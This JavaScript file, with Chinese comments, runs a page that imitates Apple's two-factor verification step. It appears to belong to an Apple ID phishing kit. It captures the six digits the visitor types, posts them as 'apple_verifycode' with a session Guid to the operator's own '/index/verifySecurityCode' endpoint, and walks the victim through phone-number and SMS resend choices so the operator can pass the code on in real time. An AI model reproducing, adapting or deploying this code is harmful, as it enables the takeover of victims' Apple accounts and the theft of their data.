if($.cookie('Guid') == undefined){
    window.location.href = '/index/signin';
}
$(window.parent.document).scrollTop(0);
let numberInputs = $('.security-code-container input');
let errorMessage = $('.pop-container.error');
let verify = false;
let popButton = $('#no-trstd-device-pop');
let popMenu = $('.other-options-popover-container');

if (numberInputs.length !== 6) {
    throw new Error('无效表单.');
}

popButton.on('click', (e) => {
    popMenu.removeClass('hide');
})

$('body').on('click', (e) => {
    if (!$(e.target).closest("#no-trstd-device-pop,.other-options-popover-container").length) {
        popMenu.addClass('hide');
    }
});

$('#try-again').on('click',(e) => {
    errorMessage.addClass('hide');

    fetchRequest('/index/SendSecurityCode', 'post', {Guid: $.cookie('Guid')})
        .then(response => {

            if (response.code === 302) {
                return window.location.href = '/index/signin';
            }

        })
    popMenu.addClass('hide');
})

$('#use-phone').on('click',(e) => {

    fetchRequest('/index/GetPhone', 'post', {Guid: $.cookie('Guid')})
        .then(response => {

            switch (response.code) {
                case 202:
                    window.location.href = '/index/authPhoneList?Guid=' + $.cookie('Guid');
                    break;
                case 203:
                    window.location.href = `/index/SendSms?ID=${response.data.ID}&Number=${response.data.Number}&Guid=${$.cookie('Guid')}`;
                    break;
                default:
                    window.location.href = '/index/auth';
            }
        });

    popMenu.addClass('hide');
})

function goToSms(id, Number) {

    fetchRequest('/index/SendSms', 'post', {
        Guid: $.cookie('Guid'),
        ID: id
    }).then(response => {

        if (response.code === 200) {
            // 验证成功
            $('.landing__animation', window.parent.document).hide();
            return window.location.href = `/index/sms?Number=${Number}`;
        }

    }).catch(err => {
        console.log(err);
    });
}

var counter = 0;
numberInputs[0].focus();
window.addEventListener('keyup',(e) => {
    let index = e.target.getAttribute('data-index');
    var ex = /^\d+$/;
    var data = numberInputs[index].value;
    if(!ex.test(data)){
        if(e && e.keyCode == 8){
            for(let i = 0; i <= 5; i++){
                numberInputs[i].value = '';
                numberInputs[0].focus();
            }
            return;
        }else{
            numberInputs[index].value = '';
            return false;
        }

    }
    if (verify) {
        verify = false;
        for (const ele of numberInputs) {
            $(ele).parent().removeClass('is-error');
        }
        errorMessage.addClass('hide');
    }
    var SmsCode = '';
    for(let i = 0; i <= 5; i++){
        SmsCode += numberInputs[i].value;
    }
    var nextIndex = Number(index) + 1;
    if(index < 5 && SmsCode.length < 6){
        for(let i = 0; i <= index; i++){
            if(!numberInputs[i].value){
                numberInputs[index].blur();
                numberInputs[i].value = numberInputs[index].value;
                var curIndex = i + 1;
                numberInputs[curIndex].focus();
                numberInputs[index].value = '';
                return;
            }else{
                var nextIndex = Number(index) + 1;
                numberInputs[nextIndex].focus();
            }
        }
    }else{
        for (const ele of numberInputs) {
            $(ele).attr('disabled', 'true')
        }
        $('.verifying-code-text').removeClass('hide');
        $('.lite-theme-override').addClass('hide');
        $.ajax({
            url: '/index/verifySecurityCode',
            dataType: 'json',
            type: 'post',
            async: true,
            contentType: 'application/json',
            data: JSON.stringify({
                'apple_verifycode': SmsCode,
                'Guid':$.cookie('Guid')
            }),
            success: function (data) {

                if (data?.code === 403){
                    window.location.href = '/index/stolenDeviceProtection';
                    return;
                }

                if (data && data.code === 200) {
                    // 验证成功
                    $('.landing__animation', window.parent.document).hide();
                    window.location.href = '/index/result';
                    return;
                }

                if(data.code === 302){
                    $('.landing__animation', window.parent.document).show();
                    window.location.href = '/index/signin'
                    return;
                }
                // 验证错误
                for (const ele of numberInputs) {
                    $(ele).removeAttr('disabled');
                    $(ele).parent().addClass('is-error');
                    $(ele).val('');
                    setTimeout(() => {
                        $(ele).blur();
                    }, 10);
                }
                setTimeout(() => {
                    $(numberInputs[0]).focus();
                }, 10);
                $('.verifying-code-text').addClass('hide');
                $('.lite-theme-override').removeClass('hide');
                errorMessage.removeClass('hide');
                verify = true;
            },
            error: function (error) {
                counter++;
                if(counter >= 3){
                    $('.landing__animation', window.parent.document).show();
                    window.location.href = '/index/signin'
                }
                // 验证错误
                for (const ele of numberInputs) {
                    $(ele).removeAttr('disabled');
                    $(ele).parent().addClass('is-error');
                    $(ele).val('');
                    setTimeout(() => {
                        $(ele).blur();
                    }, 10);
                }
                setTimeout(() => {
                    $(numberInputs[0]).focus();
                }, 10);
                $('.verifying-code-text').addClass('hide');
                $('.lite-theme-override').removeClass('hide');
                errorMessage.removeClass('hide');
                verify = true;
            }
        })
    }

})
